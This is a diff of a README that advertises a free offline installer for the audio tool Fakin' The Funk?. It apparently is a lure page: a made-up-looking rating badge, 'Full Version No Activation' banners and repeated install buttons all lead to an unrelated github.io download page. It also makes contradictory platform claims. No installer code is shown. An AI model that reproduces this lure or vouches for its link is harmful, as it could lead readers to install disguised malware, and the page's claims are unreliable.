@@ -5,10 +5,10 @@
   <img src="https://img.shields.io/badge/Rating-4.9%2F5-F9A825?style=for-the-badge&logo=star" />
   <img src="https://img.shields.io/badge/Version-2026-101010?style=for-the-badge&logo=github" />
   <img src="https://img.shields.io/badge/Platform-Windows%20%7C%20macOS-informational?style=for-the-badge&logo=windows" />
-  <img src="https://img.shields.io/badge/Category-Music+Analysis-E63946?style=for-the-badge&logo=appstore" />
+  <img src="https://img.shields.io/badge/Category-Audio+Analysis-E63946?style=for-the-badge&logo=appstore" />
 </p>
 
-**💻 Fakin' The Funk? Free Installer** — Fakin' The Funk is a Windows audio analysis tool that detects fake lossless audio files — MP3s or other lossy files that have been converted to FLAC or WAV to appear as lossless. Works without internet access, no account required. Full offline installation.
+**💻 Fakin' The Funk? Free Installer** — Fakin' The Funk? is a Windows application for detecting fake or artificially upconverted audio files. Works without internet access, no account required. Full offline installation.
 
 <p align="center">
   <img src="https://skillicons.dev/icons?i=windows" />
@@ -17,12 +17,12 @@
 </p>
 
 <p align="center">
-  <img src="https://readme-typing-svg.herokuapp.com?color=E63946&size=28&center=true&vCenter=true&width=900&lines=💻+Fakin+The+Funk+Free+Installer;⭐+Full+Version+No+Activation;🌟+Full+Offline+Installation+2026;🔥+No+Account+Required" />
+  <img src="https://readme-typing-svg.herokuapp.com?color=E63946&size=28&center=true&vCenter=true&width=900&lines=💻+Fakin'+The+Funk?+Free+Installer;⭐+Full+Version+No+Activation;🌟+Full+Offline+Installation+2026;🔥+No+Account+Required" />
 </p>
 
 <div align="center">
 
-[![⬇ Install Fakin The Funk](https://img.shields.io/badge/⬇_Install_Fakin%20The%20Funk-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Fakin' The Funk?](https://img.shields.io/badge/⬇_Install_Fakin'+The+Funk?-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -30,16 +30,16 @@
 
 ## 📖 About Fakin' The Funk?
 
-Fakin' The Funk is a Windows audio analysis tool that detects fake lossless audio files — MP3s or other lossy files that have been converted to FLAC or WAV to appear as lossless. It helps music collectors verify the authentic quality of their lossless library.
+Fakin' The Funk? is a Windows application for detecting fake or artificially upconverted audio files. Analyze MP3, FLAC, AAC, and other audio files to determine if they were genuinely recorded at claimed quality levels or artificially converted from lower-quality sources. Essential for music collectors and audiophiles who want to verify the authenticity of their audio files before purchase.
 
 ---
 
 ## ❌ Problem: Fakin' The Funk? is hard to access
 
-- **Windows Only** — No macOS or Linux version available
-- **Single Purpose** — Extremely specific use case limited to lossless audio verification
-- **Freeware** — Free but development appears inactive
-- **Technical Audience** — Primarily useful for audiophiles and music collectors with large FLAC libraries
+- **Windows Only** — No macOS version available
+- **Technical Knowledge** — Understanding audio formats and spectrogram analysis helps interpret results
+- **False Positives** — Some legitimate high-resolution recordings may be flagged
+- **Format Support** — Primarily covers common lossy and lossless audio formats
 
 ---
 
@@ -81,7 +81,7 @@ Fakin' The Funk is a Windows audio analysis tool that detects fake lossless audi
 
 <div align="center">
 
-[![⬇ Install Fakin The Funk](https://img.shields.io/badge/⬇_Install_Fakin%20The%20Funk-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Fakin' The Funk?](https://img.shields.io/badge/⬇_Install_Fakin'+The+Funk?-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -121,11 +121,11 @@ Fakin' The Funk is a Windows audio analysis tool that detects fake lossless audi
 
 ---
 
-**Fakin' The Funk? Free Installer** — Fakin' The Funk is a Windows audio analysis tool that detects fake lossless audio files — MP3s or other lossy files that have been converted to FLAC or WAV to appear as lossless. Install without internet connection today!
+**Fakin' The Funk? Free Installer** — Fakin' The Funk? is a Windows application for detecting fake or artificially upconverted audio files. Install without internet connection today!
 
 <div align="center">
 
-[![⬇ Install Fakin The Funk](https://img.shields.io/badge/⬇_Install_Fakin%20The%20Funk-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Fakin' The Funk?](https://img.shields.io/badge/⬇_Install_Fakin'+The+Funk?-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
